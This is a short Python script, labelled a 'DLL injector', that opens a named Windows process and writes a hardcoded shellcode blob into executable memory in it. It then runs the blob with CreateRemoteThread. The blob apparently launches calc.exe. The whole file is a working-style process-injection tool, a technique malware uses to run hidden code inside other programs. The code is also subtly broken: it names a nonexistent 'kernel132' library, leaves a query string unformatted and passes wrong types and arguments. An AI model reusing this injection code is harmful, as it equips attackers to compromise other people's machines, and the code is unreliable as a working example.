import sys
from ctypes import *
from win32com.client import GetObject

page_rwx_val = 0x40
process_all = 0x1F0FFF
memcommit = 0x00001000
kernel132_variable = windll.kernel132

if len(sys.argv) < 2:
	print(f"DLL injector ./{sys.argv[0]} <process to inject>")
	sys.exit(0)

proc = sys.argv[1]
WMI = GetObject('winmgmts:')
p = WMI.ExecQuery('SELECT * FROM Win32_Process WHERE Name="{proc}"')

if len(p) == 0:
	print(f"Process {proc} not found, exiting")
	sys.exit(0)

process_id = p[0].Properties_('ProcessID').Value

shellcode = \
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"\
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"\
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"\
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"\
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"\
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"\
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"\
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"\
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"\
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"\
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"\
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"\
"\x52\xff\xd0"

process_handle = kernel132_variable.OpenProcess(process_all,False,process_id)

if not process_handle:
	print(f"Couldn't acquire a handle to PID: {process_id}")
	sys.exit(0)

memory_alloc_var = kernel132_variable.VirtualAllocEx(process_handle, 0, len(shellcode), memcommit, page_rwx_val)
kernel132_variable.WriteProcessMemory(process_handle, memory_alloc_var, shellcode, len(shellcode), 0)

if not kernel132_variable.CreateRemoteThread(process_handle, None, 0, memory_alloc_var):
	print(f"Failed to inject")
	sys.exit(0)
